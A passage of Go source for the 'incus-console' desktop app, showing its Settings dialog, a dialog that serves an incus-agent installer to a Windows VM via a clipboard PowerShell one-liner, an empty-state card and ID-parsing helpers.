		fetchBtn := widget.NewButton("Fetch", nil)
		fetchBtn.OnTapped = func() {
			version := strings.TrimSpace(versionEntry.Text)
			if version == "" {
				u.showError(fmt.Errorf("enter a server version above (or connect to a host first)"))
				return
			}
			dest := strings.TrimSpace(e.Text)
			if dest == "" {
				cfgDir, _ := config.Path()
				dest = filepath.Join(filepath.Dir(cfgDir), "agents",
					agent.Filename(archParts(archCap)))
				e.SetText(dest)
			}
			fetchBtn.Disable()
			fetchBtn.SetText("Downloading…")
			go func() {
				goos, goarch := archParts(archCap)
				ctx, cancel := context.WithTimeout(context.Background(), 5*time.Minute)
				defer cancel()
				err := agent.Fetch(ctx, version, goos, goarch, dest)
				fyneDo(func() {
					fetchBtn.Enable()
					fetchBtn.SetText("Fetch")
				})
				if err != nil {
					u.showError(fmt.Errorf("%s: %w", archCap, err))
					return
				}
				u.showInfo("Fetched", archCap+" agent saved to\n"+dest)
			}()
		}

		row := container.NewBorder(nil, nil, nil, fetchBtn, e)
		items = append(items, widget.NewFormItem(arch, row))
	}
	form := widget.NewForm(items...)
	info := widget.NewLabel(
		"Path to the incus-agent binary for each target OS/arch. Only the " +
			"OS/arch of the VMs you plan to install into needs to be set. " +
			"Use Fetch to pull the binary matching the detected server version.")
	info.Wrapping = fyne.TextWrapWord
	releases := widget.NewHyperlink("Download prebuilt incus-agent binaries",
		parseURL("https://github.com/unidoc/incus-console/releases"))
	versionRow := container.NewBorder(nil, nil,
		widget.NewLabelWithStyle("Server version", fyne.TextAlignLeading, fyne.TextStyle{Bold: true}),
		nil, versionEntry)

	// Appearance — dark / light / follow-system palette. Applied
	// immediately on Save so the user sees the swap without a restart.
	themeLabels := []string{"Follow system", "Dark", "Light"}
	themeValues := []string{branding.VariantAuto, branding.VariantDark, branding.VariantLight}
	themeRadio := widget.NewRadioGroup(themeLabels, nil)
	currentVariant := u.fyneApp.Preferences().String(prefKeyThemeVariant)
	for i, v := range themeValues {
		if v == currentVariant {
			themeRadio.SetSelected(themeLabels[i])
			break
		}
	}
	if themeRadio.Selected == "" {
		themeRadio.SetSelected(themeLabels[0])
	}
	themeRadio.Horizontal = true
	appearance := container.NewVBox(
		widget.NewLabelWithStyle("Appearance", fyne.TextAlignLeading, fyne.TextStyle{Bold: true}),
		themeRadio,
	)

	body := container.NewVBox(
		appearance,
		widget.NewSeparator(),
		info, releases, versionRow, widget.NewSeparator(), form,
	)

	d := dialog.NewCustomConfirm("Settings", "Save", "Cancel", body, func(ok bool) {
		if !ok {
			return
		}
		// Persist and apply theme choice.
		chosen := branding.VariantAuto
		for i, l := range themeLabels {
			if l == themeRadio.Selected {
				chosen = themeValues[i]
				break
			}
		}
		u.fyneApp.Preferences().SetString(prefKeyThemeVariant, chosen)
		u.fyneApp.Settings().SetTheme(branding.Theme{Variant: chosen})

		if u.cfg.AgentBinaries == nil {
			u.cfg.AgentBinaries = make(map[string]string)
		}
		for arch, e := range entries {
			v := strings.TrimSpace(e.Text)
			if v == "" {
				delete(u.cfg.AgentBinaries, arch)
				continue
			}
			if _, err := os.Stat(v); err != nil {
				dialog.ShowError(fmt.Errorf("%s: %w", arch, err), u.window)
				return
			}
			u.cfg.AgentBinaries[arch] = v
		}
		if err := u.cfg.Save(); err != nil {
			dialog.ShowError(err, u.window)
		}
	}, u.window)
	d.Resize(fyne.NewSize(720, 520))
	d.Show()
}

// showInstallAgentDialog collects the three cert files for a VM and
// hands them (plus the agent binary matching the VM's OS/arch) off to
// the agent package. On success it copies the PowerShell one-liner to
// the system clipboard and shows a "paste into VM" info popup — the
// operator then hits the existing Paste button to type it into the
// running Windows PowerShell.
func (u *ui) showInstallAgentDialog(key sessionKey) {
	// Look up the VM so we know its architecture and can pick the
	// right agent binary registered in Settings.
	var vm *incus.VM
	u.mu.Lock()
	for _, vms := range u.vmCache {
		for i := range vms {
			if vms[i].Name == key.vm && vms[i].Project == key.project {
				vm = &vms[i]
				break
			}
		}
		if vm != nil {
			break
		}
	}
	u.mu.Unlock()
	if vm == nil {
		dialog.ShowError(fmt.Errorf("VM %s not found in cache — refresh and try again", key.vm), u.window)
		return
	}

	archKey := goArchFromIncus(vm.Architecture, vm.OS)
	agentPath, ok := u.cfg.AgentBinaries[archKey]
	if !ok || agentPath == "" {
		dialog.ShowInformation("Agent binary not configured",
			"No incus-agent binary registered for target "+archKey+".\n\n"+
				"Open Settings… (top-left toolbar) and set the path to a "+
				"cross-compiled incus-agent binary for this OS/arch. See the "+
				"Settings dialog for the exact go build commands.", u.window)
		return
	}

	suggested := agent.SuggestCertPaths(key.project, key.vm)
	agentCert := widget.NewEntry()
	agentCert.SetPlaceHolder(suggested[0])
	agentKey := widget.NewEntry()
	agentKey.SetPlaceHolder(suggested[1])
	serverCrt := widget.NewEntry()
	serverCrt.SetPlaceHolder(suggested[2])

	form := widget.NewForm(
		widget.NewFormItem("agent.crt", agentCert),
		widget.NewFormItem("agent.key", agentKey),
		widget.NewFormItem("server.crt", serverCrt),
	)
	info := widget.NewLabel(
		"Copy these three files off the incus host onto your Mac,\n" +
			"then pick their local paths here. See placeholders for the\n" +
			"canonical location under /var/lib/incus/…")

	body := container.NewVBox(info, form)
	d := dialog.NewCustomConfirm("Install incus-agent",
		"Serve installer", "Cancel", body, func(ok bool) {
			if !ok {
				return
			}
			b := agent.Bundle{
				AgentExe:  agentPath,
				AgentCert: strings.TrimSpace(agentCert.Text),
				AgentKey:  strings.TrimSpace(agentKey.Text),
				ServerCrt: strings.TrimSpace(serverCrt.Text),
			}
			srv, err := agent.Start(b, 10*time.Minute)
			if err != nil {
				dialog.ShowError(err, u.window)
				return
			}
			// Copy the one-liner to the clipboard so a single Paste
			// button click in the SPICE console types it into the guest.
			u.window.Clipboard().SetContent(srv.OneLiner)
			log.Printf("incus-console: agent installer serving at %s (10 min timeout)", srv.URL)
			dialog.ShowInformation("Installer ready",
				"One-liner copied to clipboard:\n\n"+
					srv.OneLiner+"\n\n"+
					"1. Open Windows PowerShell as Administrator in the VM.\n"+
					"2. Click 'Paste' in this console window.\n"+
					"3. Press Enter.\n\n"+
					"The local HTTP server auto-shuts after the install pulls "+
					"all files, or after 10 minutes.", u.window)
		}, u.window)
	d.Resize(fyne.NewSize(640, 320))
	d.Show()
}

// buildEmptyState is the "no VM selected yet" landing card. Shows the
// app icon, the tool name, a short instruction, and a UniDoc credit
// line as a clickable link. Meant to feel like the About panel and
// the empty state at once.
func buildEmptyState(a fyne.App) fyne.CanvasObject {
	icon := canvas.NewImageFromResource(a.Icon())
	icon.FillMode = canvas.ImageFillContain
	icon.SetMinSize(fyne.NewSize(160, 160))

	title := canvas.NewText("incus-console", nil)
	title.TextSize = 22
	title.TextStyle = fyne.TextStyle{Bold: true}
	title.Alignment = fyne.TextAlignCenter

	hint := widget.NewLabel("Pick a VM from the sidebar to open its console.")
	hint.Alignment = fyne.TextAlignCenter

	credit := widget.NewHyperlink("Made by UniDoc", parseURL("https://unidoc.io"))
	credit.Alignment = fyne.TextAlignCenter

	return container.NewCenter(container.NewVBox(icon, title, hint, credit))
}

// parseURL wraps url.Parse for a constant string — buildEmptyState
// needs a *url.URL literal and the error path can't fire for the
// fixed URL we pass.
func parseURL(s string) *url.URL {
	u, _ := url.Parse(s)
	return u
}

func splitID(id widget.TreeNodeID) (kind, rest string) {
	for i := 0; i < len(id); i++ {
		if id[i] == ':' {
			return string(id[:i]), string(id[i+1:])
		}
	}
	return string(id), ""
}

func splitHostProj(s string) (host, project string, ok bool) {
	for i := 0; i < len(s); i++ {
		if s[i] == ':' {
			return s[:i], s[i+1:], true
		}
	}
	return "", "", false
}

func splitHostProjVM(s string) (host, project, vm string, ok bool) {
	first := -1
	second := -1
	for i := 0; i < len(s); i++ {
		if s[i] == ':' {
			if first < 0 {
				first = i
			} else {
				second = i
				break
			}
		}
	}
	if first < 0 || second < 0 {
		return "", "", "", false
	}
	return s[:first], s[first+1 : second], s[second+1:], true
}
